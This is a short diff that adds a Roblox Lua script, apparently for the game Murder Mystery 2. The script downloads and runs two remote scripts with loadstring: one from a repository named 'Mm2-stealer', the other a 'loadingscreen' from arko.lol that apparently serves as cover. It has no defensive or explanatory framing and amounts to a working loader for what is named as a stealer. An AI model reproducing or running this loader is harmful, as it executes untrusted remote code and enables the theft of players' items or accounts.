@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SDF8/Mm2-stealer/refs/heads/main/stealer.lua", true))()
+end
+
+local function loadingscreen()
+    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadingscreen)
